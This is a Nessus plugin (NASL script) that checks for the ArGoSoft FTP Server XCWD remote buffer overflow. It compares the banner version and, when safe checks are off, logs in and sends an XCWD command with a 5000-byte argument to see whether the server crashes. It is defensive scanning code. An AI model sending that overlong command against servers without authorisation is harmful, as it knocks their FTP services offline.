#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(15439);
 script_version("$Revision: 1.16 $");
 script_cvs_date("$Date: 2016/10/07 13:30:46 $");

 script_bugtraq_id(8704);
 script_osvdb_id(2618);

 script_name(english:"ArGoSoft FTP Server XCWD Remote Overflow");
 script_summary(english:"Attempts a XCWD buffer overflow");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is running an FTP server which is affected by a remote
buffer overrun vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the ArGoSoft FTP server.

It was possible to shut down the remote FTP server by issuing
a XCWD command followed by a too long argument.

This problem allows an attacker to prevent the remote site i
from sharing some resources with the rest of the world." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/vuln-dev/2003/Sep/59" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to 1.4.1.2 or newer." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");

 script_set_attribute(attribute:"plugin_publication_date", value: "2004/10/08");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/09/23");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2004-2016 Tenable Network Security, Inc.");
 script_family(english:"FTP");
 script_dependencie("find_service1.nasl", "ftp_anonymous.nasl",
 		    "ftpserver_detect_type_nd_version.nasl");
 script_require_keys("ftp/login");
 script_require_ports("Services/ftp", 21);
 
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("ftp_func.inc");
include("misc_func.inc");

port = get_ftp_port(default: 21);

login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

soc = open_sock_tcp(port);
if (! soc) exit(1, "Cannot connect to TCP port "+port+".");

    if (safe_checks() || ! login)
    {
    	banner = get_ftp_banner(port: port);
	if ( ! banner ) exit(0);
	#220 ArGoSoft FTP Server for Windows NT/2000/XP, Version 1.4 (1.4.1.1)
	if (egrep(pattern:".*ArGoSoft FTP Server .* Version .* \((0\.|1\.([0-3]\.|4(\.0|\.1\.[01])))\).*", string:banner) ) security_warning(port);
	exit(0);
    }
    else
    {
      if (! ftp_authenticate(socket:soc, user:login, pass:password))
      {
        ftp_close(socket: soc);
	exit(0, "Cannot authenticate on FTP server on port "+port+".");
      }
   	s = string("XCWD ", crap(5000), "\r\n");
   	send(socket:soc, data:s);
   	r = recv_line(socket:soc, length:1024);
   	close(soc);
       
        if (service_is_dead(port: port, exit: 1) > 0)
	{
          security_warning(port);
     	  exit(0);
        }
    }
